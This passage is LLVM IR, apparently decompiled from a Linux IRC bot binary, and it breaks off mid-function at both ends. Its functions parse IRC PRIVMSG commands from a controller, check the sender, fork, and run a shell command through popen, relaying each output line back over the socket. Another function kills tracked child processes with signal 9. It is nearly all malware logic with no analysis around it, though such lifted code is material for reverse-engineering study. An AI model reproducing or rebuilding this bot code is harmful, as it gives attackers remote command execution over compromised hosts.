  %v0_804a211 = phi i32 [ %v1_8049fb0, %entry ], [ %v1_804a20b, %dec_label_pc_8049fc0 ]
  ret i32 %v0_804a211

; uselistorder directives
  uselistorder i32 %arg1, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a210, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a212 = load i32, i32* @ebp, align 4
  store i32 %v0_804a212, i32* %stack_var_-4, align 4
  %v4_804a212 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a212, i32* @ebp, align 4
  %v4_804a256 = icmp eq i32 %arg2, 0
  %v0_804a2a514 = load i32, i32* @global_var_8062a90.30, align 16
  %v10_804a2aa16 = icmp eq i32 %v0_804a2a514, 0
  br i1 %v10_804a2aa16, label %dec_label_pc_804a2b3, label %dec_label_pc_804a225

dec_label_pc_804a225:                             ; preds = %entry, %dec_label_pc_804a2a2
  %storemerge20 = phi i32 [ %v4_804a2a2, %dec_label_pc_804a2a2 ], [ 0, %entry ]
  %v2_804a228 = mul i32 %storemerge20, 4
  %v0_804a22d = load i32, i32* @global_var_806764c.31, align 4
  %v2_804a232 = add i32 %v0_804a22d, %v2_804a228
  %v1_804a235 = inttoptr i32 %v2_804a232 to i32*
  %v2_804a235 = load i32, i32* %v1_804a235, align 4
  %v1_804a237 = icmp eq i32 %v2_804a235, 0
  br i1 %v1_804a237, label %dec_label_pc_804a2a2, label %dec_label_pc_804a23b

dec_label_pc_804a23b:                             ; preds = %dec_label_pc_804a225
  %v2_804a24b = load i32, i32* %v1_804a235, align 4
  store i32 %v2_804a24b, i32* @ebx, align 4
  %v1_804a24d = call i32 @__libc_getpid(i32 %storemerge20)
  %v0_804a252 = load i32, i32* @ebx, align 4
  %v12_804a252 = icmp eq i32 %v0_804a252, %v1_804a24d
  br i1 %v12_804a252, label %dec_label_pc_804a2a2, label %dec_label_pc_804a256

dec_label_pc_804a256:                             ; preds = %dec_label_pc_804a23b
  br i1 %v4_804a256, label %dec_label_pc_804a256.dec_label_pc_804a282_crit_edge, label %dec_label_pc_804a25c

dec_label_pc_804a256.dec_label_pc_804a282_crit_edge: ; preds = %dec_label_pc_804a256
  br label %dec_label_pc_804a282

dec_label_pc_804a25c:                             ; preds = %dec_label_pc_804a256
  %v3_804a27a = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_805afd2.99 to i32))
  br label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a256.dec_label_pc_804a282_crit_edge, %dec_label_pc_804a25c
  %v0_804a28a = load i32, i32* @global_var_806764c.31, align 4
  %v2_804a28f = add i32 %v0_804a28a, %v2_804a228
  %v1_804a292 = inttoptr i32 %v2_804a28f to i32*
  %v2_804a292 = load i32, i32* %v1_804a292, align 4
  %v3_804a29a = call i32 @kill(i32 %v2_804a292, i32 9)
  br label %dec_label_pc_804a2a2

dec_label_pc_804a2a2:                             ; preds = %dec_label_pc_804a23b, %dec_label_pc_804a225, %dec_label_pc_804a282
  %v4_804a2a2 = add i32 %storemerge20, 1
  %v0_804a2a5 = load i32, i32* @global_var_8062a90.30, align 16
  %v10_804a2aa = icmp ult i32 %v4_804a2a2, %v0_804a2a5
  br i1 %v10_804a2aa, label %dec_label_pc_804a225, label %dec_label_pc_804a2a5.dec_label_pc_804a2b3_crit_edge

dec_label_pc_804a2a5.dec_label_pc_804a2b3_crit_edge: ; preds = %dec_label_pc_804a2a2
  br label %dec_label_pc_804a2b3

dec_label_pc_804a2b3:                             ; preds = %entry, %dec_label_pc_804a2a5.dec_label_pc_804a2b3_crit_edge
  %v0_804a2a5.lcssa = phi i32 [ %v0_804a2a5, %dec_label_pc_804a2a5.dec_label_pc_804a2b3_crit_edge ], [ 0, %entry ]
  ret i32 %v0_804a2a5.lcssa

; uselistorder directives
  uselistorder i32 %v4_804a2a2, { 1, 0 }
  uselistorder i32 %v2_804a228, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804a2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804a2a2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a282, { 1, 0 }
  uselistorder label %dec_label_pc_804a225, { 1, 0 }
}

define i32 @killd(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804a2c9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a321.29 to i32))
  ret i32 %v3_804a2c9
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %tmp65 = inttoptr i32 %arg3 to i8*
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-2136 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-2204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a2d8 = load i32, i32* @ebx, align 4
  store i32 %v0_804a2d8, i32* %stack_var_-16, align 4
  %v5_804a2d9 = icmp ult i32* %stack_var_-16, inttoptr (i32 2188 to i32*)
  store i1 %v5_804a2d9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804a2eb

dec_label_pc_804a2e8:                             ; preds = %dec_label_pc_804a310
  %v4_804a2e8 = add i32 %storemerge16, 1
  br label %dec_label_pc_804a2eb

dec_label_pc_804a2eb:                             ; preds = %entry, %dec_label_pc_804a2e8
  %storemerge16 = phi i32 [ %v4_804a2e8, %dec_label_pc_804a2e8 ], [ 0, %entry ]
  store i32 %storemerge16, i32* %edx.global-to-local, align 4
  %v3_804a305 = call i32 @_strlen(i8* %tmp65)
  %v7_804a30c = icmp ult i32 %storemerge16, %v3_804a305
  store i1 %v7_804a30c, i1* %cf.global-to-local, align 1
  %v1_804a30e = icmp eq i1 %v7_804a30c, false
  %.pre = add i32 %storemerge16, %arg3
  br i1 %v1_804a30e, label %dec_label_pc_804a2eb.dec_label_pc_804a31c_crit_edge, label %dec_label_pc_804a310

dec_label_pc_804a2eb.dec_label_pc_804a31c_crit_edge: ; preds = %dec_label_pc_804a2eb
  %.pre37 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804a31c

dec_label_pc_804a310:                             ; preds = %dec_label_pc_804a2eb
  %v11_804a313 = icmp ult i32 %.pre, %storemerge16
  store i1 %v11_804a313, i1* %cf.global-to-local, align 1
  %v1_804a316 = inttoptr i32 %.pre to i8*
  %v2_804a316 = load i8, i8* %v1_804a316, align 1
  %v3_804a318 = icmp ult i8 %v2_804a316, 32
  store i1 %v3_804a318, i1* %cf.global-to-local, align 1
  %v7_804a318 = icmp eq i8 %v2_804a316, 32
  %v1_804a31a = icmp eq i1 %v7_804a318, false
  br i1 %v1_804a31a, label %dec_label_pc_804a2e8, label %dec_label_pc_804a31c

dec_label_pc_804a31c:                             ; preds = %dec_label_pc_804a310, %dec_label_pc_804a2eb.dec_label_pc_804a31c_crit_edge
  %v1_804a322.pre-phi = phi i8* [ %.pre37, %dec_label_pc_804a2eb.dec_label_pc_804a31c_crit_edge ], [ %v1_804a316, %dec_label_pc_804a310 ]
  store i8 0, i8* %v1_804a322.pre-phi, align 1
  %v1_804a331 = add i32 %.pre, 2
  %v5_804a331 = icmp ugt i32 %.pre, -3
  store i1 %v5_804a331, i1* %cf.global-to-local, align 1
  %v5_804a334 = inttoptr i32 %v1_804a331 to i8*
  store i8* %v5_804a334, i8** %stack_var_-32, align 4
  %v4_804a346 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804a343

dec_label_pc_804a340:                             ; preds = %dec_label_pc_804a368
  %v4_804a340 = add i32 %storemerge15, 1
  br label %dec_label_pc_804a343

dec_label_pc_804a343:                             ; preds = %dec_label_pc_804a31c, %dec_label_pc_804a340
  %storemerge15 = phi i32 [ %v4_804a340, %dec_label_pc_804a340 ], [ 0, %dec_label_pc_804a31c ]
  store i32 %storemerge15, i32* %edx.global-to-local, align 4
  store i32 %v4_804a346, i32* @edi, align 4
  %v3_804a35d = call i32 @_strlen(i8* %arg2)
  %v7_804a364 = icmp ult i32 %storemerge15, %v3_804a35d
  store i1 %v7_804a364, i1* %cf.global-to-local, align 1
  %v1_804a366 = icmp eq i1 %v7_804a364, false
  %.pre38 = add i32 %storemerge15, %v4_804a346
  br i1 %v1_804a366, label %dec_label_pc_804a343.dec_label_pc_804a374_crit_edge, label %dec_label_pc_804a368

dec_label_pc_804a343.dec_label_pc_804a374_crit_edge: ; preds = %dec_label_pc_804a343
  %.pre45 = inttoptr i32 %.pre38 to i8*
  br label %dec_label_pc_804a374

dec_label_pc_804a368:                             ; preds = %dec_label_pc_804a343
  %v11_804a36b = icmp ult i32 %.pre38, %storemerge15
  store i1 %v11_804a36b, i1* %cf.global-to-local, align 1
  %v1_804a36e = inttoptr i32 %.pre38 to i8*
  %v2_804a36e = load i8, i8* %v1_804a36e, align 1
  %v6_804a370 = icmp ult i8 %v2_804a36e, 33
  store i1 %v6_804a370, i1* %cf.global-to-local, align 1
  %v10_804a370 = icmp eq i8 %v2_804a36e, 33
  %v1_804a372 = icmp eq i1 %v10_804a370, false
  br i1 %v1_804a372, label %dec_label_pc_804a340, label %dec_label_pc_804a374

dec_label_pc_804a374:                             ; preds = %dec_label_pc_804a368, %dec_label_pc_804a343.dec_label_pc_804a374_crit_edge
  %v1_804a37a.pre-phi = phi i8* [ %.pre45, %dec_label_pc_804a343.dec_label_pc_804a374_crit_edge ], [ %v1_804a36e, %dec_label_pc_804a368 ]
  %v11_804a377 = icmp ult i32 %.pre38, %storemerge15
  store i1 %v11_804a377, i1* %cf.global-to-local, align 1
  store i8 0, i8* %v1_804a37a.pre-phi, align 1
  %v3_804a37d = load i8*, i8** %stack_var_-32, align 4
  %v4_804a37d = ptrtoint i8* %v3_804a37d to i32
  %v2_804a380 = load i8, i8* %v3_804a37d, align 1
  %v3_804a380 = zext i8 %v2_804a380 to i32
  %v5_804a380 = and i32 %v4_804a37d, -256
  %v6_804a380 = or i32 %v3_804a380, %v5_804a380
  %v6_804a382 = icmp ult i8 %v2_804a380, 33
  store i1 %v6_804a382, i1* %cf.global-to-local, align 1
  %v10_804a382 = icmp eq i8 %v2_804a380, 33
  %v1_804a384 = icmp eq i1 %v10_804a382, false
  br i1 %v1_804a384, label %dec_label_pc_804a7db, label %dec_label_pc_804a38a

dec_label_pc_804a38a:                             ; preds = %dec_label_pc_804a374
  %v0_804a38a = load i32, i32* @global_var_8067648.100, align 8
  %v0_804a38f = load i32, i32* @esp, align 4
  %v5_804a38f = icmp ult i32 %v0_804a38f, 8
  store i1 %v5_804a38f, i1* %cf.global-to-local, align 1
  %v4_804a396 = call i32 @__GI_strcasecmp(i8* %tmp65, i32 %v0_804a38a)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a39e = icmp eq i32 %v4_804a396, 0
  %v1_804a3a0 = icmp eq i1 %v1_804a39e, false
  br i1 %v1_804a3a0, label %dec_label_pc_804a7db, label %dec_label_pc_804a3a6

dec_label_pc_804a3a6:                             ; preds = %dec_label_pc_804a38a
  %v2_804a3a6 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 %v2_804a3a6, i32* %edx.global-to-local, align 4
  %v5_804a3b1 = icmp ult i32* %stack_var_-2204, inttoptr (i32 4 to i32*)
  store i1 %v5_804a3b1, i1* %cf.global-to-local, align 1
  %v5_804a3b8 = bitcast i32* %stack_var_-1112 to i8*
  %v6_804a3b8 = call i32 @__GI_memset(i8* %v5_804a3b8, i32 0, i32 1024)
  %v0_804a3bd = load i32, i32* @esp, align 4
  %v2_804a3bd = icmp ugt i32 %v0_804a3bd, -17
  store i1 %v2_804a3bd, i1* %cf.global-to-local, align 1
  %v3_804a3c7 = load i8*, i8** %stack_var_-32, align 4
  %v4_804a3c7 = ptrtoint i8* %v3_804a3c7 to i32
  %v5_804a3c7 = add i32 %v4_804a3c7, 1
  %v22_804a3c7 = inttoptr i32 %v5_804a3c7 to i8*
  store i8* %v22_804a3c7, i8** %stack_var_-32, align 4
  br label %dec_label_pc_804a3d6

dec_label_pc_804a3d3:                             ; preds = %dec_label_pc_804a3fb
  %v4_804a3d3 = add i32 %storemerge14, 1
  br label %dec_label_pc_804a3d6

dec_label_pc_804a3d6:                             ; preds = %dec_label_pc_804a3a6, %dec_label_pc_804a3d3
  %v3_804a3d9 = phi i8* [ %v4_804a40a.pre, %dec_label_pc_804a3d3 ], [ %v22_804a3c7, %dec_label_pc_804a3a6 ]
  %storemerge14 = phi i32 [ %v4_804a3d3, %dec_label_pc_804a3d3 ], [ 0, %dec_label_pc_804a3a6 ]
  store i32 %storemerge14, i32* @edx, align 4
  %v3_804a3f0 = call i32 @_strlen(i8* %v3_804a3d9)
  %v0_804a3f7 = load i32, i32* @edx, align 4
  %v7_804a3f7 = icmp ult i32 %v0_804a3f7, %v3_804a3f0
  store i1 %v7_804a3f7, i1* %cf.global-to-local, align 1
  %v1_804a3f9 = icmp eq i1 %v7_804a3f7, false
  %v4_804a40a.pre = load i8*, i8** %stack_var_-32, align 4
  %.pre130 = ptrtoint i8* %v4_804a40a.pre to i32
  %.pre131 = add i32 %.pre130, %storemerge14
  br i1 %v1_804a3f9, label %dec_label_pc_804a3d6.dec_label_pc_804a407_crit_edge, label %dec_label_pc_804a3fb

dec_label_pc_804a3d6.dec_label_pc_804a407_crit_edge: ; preds = %dec_label_pc_804a3d6
  %.pre132 = inttoptr i32 %.pre131 to i8*
  br label %dec_label_pc_804a407

dec_label_pc_804a3fb:                             ; preds = %dec_label_pc_804a3d6
  %v11_804a3fe = icmp ult i32 %.pre131, %storemerge14
  store i1 %v11_804a3fe, i1* %cf.global-to-local, align 1
  %v1_804a401 = inttoptr i32 %.pre131 to i8*
  %v2_804a401 = load i8, i8* %v1_804a401, align 1
  %v3_804a403 = icmp ult i8 %v2_804a401, 32
  store i1 %v3_804a403, i1* %cf.global-to-local, align 1
  %v7_804a403 = icmp eq i8 %v2_804a401, 32
  %v1_804a405 = icmp eq i1 %v7_804a403, false
  br i1 %v1_804a405, label %dec_label_pc_804a3d3, label %dec_label_pc_804a407

dec_label_pc_804a407:                             ; preds = %dec_label_pc_804a3d6.dec_label_pc_804a407_crit_edge, %dec_label_pc_804a3fb
  %v1_804a40d.pre-phi = phi i8* [ %.pre132, %dec_label_pc_804a3d6.dec_label_pc_804a407_crit_edge ], [ %v1_804a401, %dec_label_pc_804a3fb ]
  store i8 0, i8* %v1_804a40d.pre-phi, align 1
  %v0_804a410 = load i32, i32* @global_var_8067524.101, align 4
  %v0_804a415 = load i32, i32* @esp, align 4
  %v5_804a415 = icmp ult i32 %v0_804a415, 8
  store i1 %v5_804a415, i1* %cf.global-to-local, align 1
  %v3_804a419 = load i8*, i8** %stack_var_-32, align 4
  %v4_804a41c = call i32 @strwildmatch(i8* %v3_804a419, i32 %v0_804a410)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a424 = icmp eq i32 %v4_804a41c, 0
  %v1_804a426 = icmp eq i1 %v1_804a424, false
  br i1 %v1_804a426, label %dec_label_pc_804a7db, label %dec_label_pc_804a42c

dec_label_pc_804a42c:                             ; preds = %dec_label_pc_804a407
  %v4_804a42f = load i8*, i8** %stack_var_-32, align 4
  %v5_804a42f = ptrtoint i8* %v4_804a42f to i32
  %v6_804a42f = add i32 %v5_804a42f, %storemerge14
  %v11_804a42f = icmp ult i32 %v6_804a42f, %storemerge14
  store i1 %v11_804a42f, i1* %cf.global-to-local, align 1
  %v1_804a432 = add i32 %v6_804a42f, 1
  %v5_804a433 = inttoptr i32 %v1_804a432 to i8*
  store i8* %v5_804a433, i8** %stack_var_-32, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804a432, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805b050.102 to i32), i32* @edi, align 4
  %v7_804a466 = call i32 @_strncmp(i8* %v5_804a433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b050.102, i32 0, i32 0), i32 4)
  %v8_804a466 = urem i32 %v7_804a466, 2
  %v9_804a466 = icmp eq i32 %v8_804a466, 0
  %v0_804a468 = load i1, i1* %cf.global-to-local, align 1
  %v2_804a468 = or i1 %v0_804a468, %v9_804a466
  %v3_804a468 = zext i1 %v2_804a468 to i32
  %v4_804a468 = load i32, i32* @edx, align 4
  %v5_804a468 = and i32 %v4_804a468, -256
  %v6_804a468 = or i32 %v3_804a468, %v5_804a468
  %v7_804a468 = xor i32 %v6_804a468, 1
  store i32 %v7_804a468, i32* @edx, align 4
  %v1_804a470 = trunc i32 %v7_804a468 to i8
  %v3_804a470 = zext i1 %v0_804a468 to i8
  %v15_804a470 = icmp eq i8 %v1_804a470, %v3_804a470
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a479 = icmp eq i1 %v15_804a470, false
  br i1 %v1_804a479, label %dec_label_pc_804a4b6, label %dec_label_pc_804a47b

dec_label_pc_804a47b:                             ; preds = %dec_label_pc_804a42c
  %v0_804a47b = load i8, i8* @global_var_8062a84.27, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a480 = icmp eq i8 %v0_804a47b, 0
  br i1 %v4_804a480, label %dec_label_pc_804a49c, label %dec_label_pc_804a484

dec_label_pc_804a484:                             ; preds = %dec_label_pc_804a47b
  %v0_804a484 = load i32, i32* @esp, align 4
  %v5_804a484 = icmp ult i32 %v0_804a484, 4
  store i1 %v5_804a484, i1* %cf.global-to-local, align 1
  %v3_804a492 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a321.29 to i32))
  %v0_804a497 = load i32, i32* @esp, align 4
  %v2_804a497 = icmp ugt i32 %v0_804a497, -17
  store i1 %v2_804a497, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804a4b6

dec_label_pc_804a49c:                             ; preds = %dec_label_pc_804a47b
  %v0_804a4a2 = load i32, i32* @esp, align 4
  %v5_804a4a2 = icmp ult i32 %v0_804a4a2, 4
  store i1 %v5_804a4a2, i1* %cf.global-to-local, align 1
  %v3_804a4ae = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_805b055.103 to i32))
  %v0_804a4b3 = load i32, i32* @esp, align 4
  %v2_804a4b3 = icmp ugt i32 %v0_804a4b3, -17
  store i1 %v2_804a4b3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804a4b6

dec_label_pc_804a4b6:                             ; preds = %dec_label_pc_804a42c, %dec_label_pc_804a484, %dec_label_pc_804a49c
  %v3_804a4b6 = load i8*, i8** %stack_var_-32, align 4
  %v4_804a4b6 = ptrtoint i8* %v3_804a4b6 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_804a4b6, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b059.104 to i32), i32* @edi, align 4
  %v7_804a4e6 = call i32 @_strncmp(i8* %v3_804a4b6, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b059.104, i32 0, i32 0), i32 3)
  %v8_804a4e6 = urem i32 %v7_804a4e6, 2
  %v9_804a4e6 = icmp eq i32 %v8_804a4e6, 0
  %v0_804a4e8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804a4e8 = or i1 %v0_804a4e8, %v9_804a4e6
  %v3_804a4e8 = zext i1 %v2_804a4e8 to i32
  %v4_804a4e8 = load i32, i32* @edx, align 4
  %v5_804a4e8 = and i32 %v4_804a4e8, -256
  %v6_804a4e8 = or i32 %v3_804a4e8, %v5_804a4e8
  %v7_804a4e8 = xor i32 %v6_804a4e8, 1
  store i32 %v7_804a4e8, i32* %edx.global-to-local, align 4
  %v3_804a4ee = and i32 %v7_804a4e6, -256
  %v1_804a4f0 = trunc i32 %v7_804a4e8 to i8
  %v3_804a4f0 = zext i1 %v0_804a4e8 to i8
  %v4_804a4f0 = sub nsw i8 %v1_804a4f0, %v3_804a4f0
  %v15_804a4f0 = icmp eq i8 %v4_804a4f0, 0
  %v20_804a4f0 = zext i8 %v4_804a4f0 to i32
  %v23_804a4f0 = or i32 %v20_804a4f0, %v3_804a4ee
  store i32 %v23_804a4f0, i32* @ecx, align 4
  %v2_804a4f4 = sext i8 %v4_804a4f0 to i32
  store i32 %v2_804a4f4, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a4f9 = icmp eq i1 %v15_804a4f0, false
  br i1 %v1_804a4f9, label %dec_label_pc_804a5ec, label %dec_label_pc_804a4ff

dec_label_pc_804a4ff:                             ; preds = %dec_label_pc_804a4b6
  %v0_804a4ff = load i32, i32* @esp, align 4
  %v5_804a4ff = icmp ult i32 %v0_804a4ff, 12
  store i1 %v5_804a4ff, i1* %cf.global-to-local, align 1
  %v1_804a505 = call i32 @mfork(i32 %v4_804a346)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a50d = icmp eq i32 %v1_804a505, 0
  %v1_804a50f = icmp eq i1 %v1_804a50d, false
  br i1 %v1_804a50f, label %dec_label_pc_804a7db, label %dec_label_pc_804a515

dec_label_pc_804a515:                             ; preds = %dec_label_pc_804a4ff
  store i1 %v5_804a3b1, i1* %cf.global-to-local, align 1
  %v2_804a51f = ptrtoint i32* %stack_var_-2136 to i32
  %v5_804a526 = bitcast i32* %stack_var_-2136 to i8*
  %v6_804a526 = call i32 @__GI_memset(i8* %v5_804a526, i32 0, i32 1024)
  store i1 %v5_804a3b1, i1* %cf.global-to-local, align 1
  %v3_804a544 = call i32 @sprintf(i32 %v2_804a51f, i32 ptrtoint ([60 x i8]* @global_var_805b060.105 to i32))
  %v5_804a54c = icmp ult i32* %stack_var_-2204, inttoptr (i32 8 to i32*)
  store i1 %v5_804a54c, i1* %cf.global-to-local, align 1
  store i32 %v2_804a51f, i32* @eax, align 4
  %v4_804a55b = call i32 @popen(i32 %v2_804a51f, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805a33f.34, i32 0, i32 0))
  %v5_804a5c2 = icmp ult i32* %stack_var_-2204, inttoptr (i32 12 to i32*)
  %v1_804a5c8 = inttoptr i32 %v4_804a55b to i32*
  store i1 %v5_804a5c2, i1* %cf.global-to-local, align 1
  %v2_804a5c8119 = call i32 @feof(i32* %v1_804a5c8)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a5d0120 = icmp eq i32 %v2_804a5c8119, 0
  br i1 %v1_804a5d0120, label %dec_label_pc_804a568, label %dec_label_pc_804a5d4

dec_label_pc_804a568:                             ; preds = %dec_label_pc_804a515, %dec_label_pc_804a568
  store i1 %v5_804a3b1, i1* %cf.global-to-local, align 1
  %v6_804a579 = call i32 @__GI_memset(i8* %v5_804a526, i32 0, i32 1024)
  store i1 %v5_804a3b1, i1* %cf.global-to-local, align 1
  %v5_804a593 = call i32 @fgets(i32 %v2_804a51f, i32 1024, i32 %v4_804a55b)
  %v0_804a598 = load i32, i32* @esp, align 4
  %v2_804a598 = icmp ugt i32 %v0_804a598, -17
  store i1 %v2_804a598, i1* %cf.global-to-local, align 1
  store i32 %v2_804a51f, i32* %stack_var_-2208, align 4
  %v3_804a5ad = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_805b09c.106 to i32))
  store i1 %v5_804a5c2, i1* %cf.global-to-local, align 1
  %v1_804a5ba = call i32 @sleep(i32 1)
  store i1 %v5_804a5c2, i1* %cf.global-to-local, align 1
  %v2_804a5c8 = call i32 @feof(i32* %v1_804a5c8)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a5d0 = icmp eq i32 %v2_804a5c8, 0
  br i1 %v1_804a5d0, label %dec_label_pc_804a568, label %dec_label_pc_804a5d4

dec_label_pc_804a5d4:                             ; preds = %dec_label_pc_804a568, %dec_label_pc_804a515
  store i1 %v5_804a5c2, i1* %cf.global-to-local, align 1
  %v1_804a5da = call i32 @pclose(i32 %v4_804a55b)
  store i1 %v5_804a5c2, i1* %cf.global-to-local, align 1
  %v1_804a5e7 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804a5ec

dec_label_pc_804a5ec:                             ; preds = %dec_label_pc_804a4b6, %dec_label_pc_804a5d4
  %v3_804a5ec = load i8*, i8** %stack_var_-32, align 4
  %v3_804a603 = call i32 @_strlen(i8* %v3_804a5ec)
  %v4_804a603 = mul i32 %v3_804a603, -1
  %v1_804a609 = sub i32 0, %v4_804a603
  %v10_804a640108 = icmp ne i32 %v4_804a603, 0
  store i1 %v10_804a640108, i1* %cf.global-to-local, align 1
  %v5_804a643112 = icmp sgt i32 %v1_804a609, 0
  %v3_804a616113 = load i8*, i8** %stack_var_-32, align 4
  br i1 %v5_804a643112, label %dec_label_pc_804a616, label %dec_label_pc_804a660

dec_label_pc_804a616:                             ; preds = %dec_label_pc_804a5ec, %dec_label_pc_804a628
  %v3_804a616115 = phi i8* [ %v22_804a637, %dec_label_pc_804a628 ], [ %v3_804a616113, %dec_label_pc_804a5ec ]
  %storemerge12114 = phi i32 [ %v4_804a63a, %dec_label_pc_804a628 ], [ 0, %dec_label_pc_804a5ec ]
  %v4_804a616 = ptrtoint i8* %v3_804a616115 to i32
  %v2_804a619 = load i8, i8* %v3_804a616115, align 1
  %v5_804a619 = and i32 %v4_804a616, -256
  %v3_804a61b = icmp ult i8 %v2_804a619, 32
  store i1 %v3_804a61b, i1* %cf.global-to-local, align 1
  %v7_804a61b = icmp eq i8 %v2_804a619, 32
  br i1 %v7_804a61b, label %dec_label_pc_804a660, label %dec_label_pc_804a61f

dec_label_pc_804a61f:                             ; preds = %dec_label_pc_804a616
  %v2_804a622 = load i8, i8* %v3_804a616115, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a624 = icmp eq i8 %v2_804a622, 0
  br i1 %v4_804a624, label %dec_label_pc_804a660, label %dec_label_pc_804a628

dec_label_pc_804a628:                             ; preds = %dec_label_pc_804a61f
  store i32 %v4_804a616, i32* %edx.global-to-local, align 4
  %v2_804a62e = load i8, i8* %v3_804a616115, align 1
  %v3_804a62e = zext i8 %v2_804a62e to i32
  %v6_804a62e = or i32 %v3_804a62e, %v5_804a619
  store i32 %v6_804a62e, i32* %edx.global-to-local, align 4
  %v2_804a630 = load i32, i32* @ebp, align 4
  %v4_804a630 = add nsw i32 %storemerge12114, -1108
  %v5_804a630 = add i32 %v4_804a630, %v2_804a630
  %v6_804a630 = inttoptr i32 %v5_804a630 to i8*
  store i8 %v2_804a62e, i8* %v6_804a630, align 1
  %v3_804a637 = load i8*, i8** %stack_var_-32, align 4
  %v4_804a637 = ptrtoint i8* %v3_804a637 to i32
  %v5_804a637 = add i32 %v4_804a637, 1
  %v22_804a637 = inttoptr i32 %v5_804a637 to i8*
  store i8* %v22_804a637, i8** %stack_var_-32, align 4
  %v4_804a63a = add nuw nsw i32 %storemerge12114, 1
  %v10_804a640 = icmp ult i32 %v4_804a63a, %v1_804a609
  store i1 %v10_804a640, i1* %cf.global-to-local, align 1
  %v5_804a643 = icmp slt i32 %v4_804a63a, %v1_804a609
  br i1 %v5_804a643, label %dec_label_pc_804a616, label %dec_label_pc_804a660

dec_label_pc_804a64e:                             ; preds = %dec_label_pc_804a660
  %v4_804a651 = load i8*, i8** %stack_var_-32, align 4
  %v5_804a651 = ptrtoint i8* %v4_804a651 to i32
  %v6_804a651 = add i32 %v5_804a651, %storemerge11
  %v11_804a651 = icmp ult i32 %v6_804a651, %storemerge11
  store i1 %v11_804a651, i1* %cf.global-to-local, align 1
  %v1_804a654 = inttoptr i32 %v6_804a651 to i8*
  %v2_804a654 = load i8, i8* %v1_804a654, align 1
  %v3_804a656 = icmp ult i8 %v2_804a654, 32
  store i1 %v3_804a656, i1* %cf.global-to-local, align 1
  %v7_804a656 = icmp eq i8 %v2_804a654, 32
  %v1_804a658 = icmp eq i1 %v7_804a656, false
  br i1 %v1_804a658, label %dec_label_pc_804a65d, label %dec_label_pc_804a65a

dec_label_pc_804a65a:                             ; preds = %dec_label_pc_804a64e
  %v4_804a65a = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804a65d

dec_label_pc_804a65d:                             ; preds = %dec_label_pc_804a64e, %dec_label_pc_804a65a
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804a64e ], [ %v4_804a65a, %dec_label_pc_804a65a ]
  %v4_804a65d = add i32 %storemerge11, 1
  br label %dec_label_pc_804a660

dec_label_pc_804a660:                             ; preds = %dec_label_pc_804a5ec, %dec_label_pc_804a61f, %dec_label_pc_804a616, %dec_label_pc_804a628, %dec_label_pc_804a65d
  %v3_804a663 = phi i8* [ %v4_804a651, %dec_label_pc_804a65d ], [ %v3_804a616113, %dec_label_pc_804a5ec ], [ %v3_804a616115, %dec_label_pc_804a61f ], [ %v3_804a616115, %dec_label_pc_804a616 ], [ %v22_804a637, %dec_label_pc_804a628 ]
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804a65d ], [ 0, %dec_label_pc_804a5ec ], [ 0, %dec_label_pc_804a61f ], [ 0, %dec_label_pc_804a616 ], [ 0, %dec_label_pc_804a628 ]
  %storemerge11 = phi i32 [ %v4_804a65d, %dec_label_pc_804a65d ], [ 0, %dec_label_pc_804a5ec ], [ 0, %dec_label_pc_804a61f ], [ 0, %dec_label_pc_804a616 ], [ 0, %dec_label_pc_804a628 ]
  store i32 %storemerge11, i32* %edx.global-to-local, align 4
  %v4_804a663 = ptrtoint i8* %v3_804a663 to i32
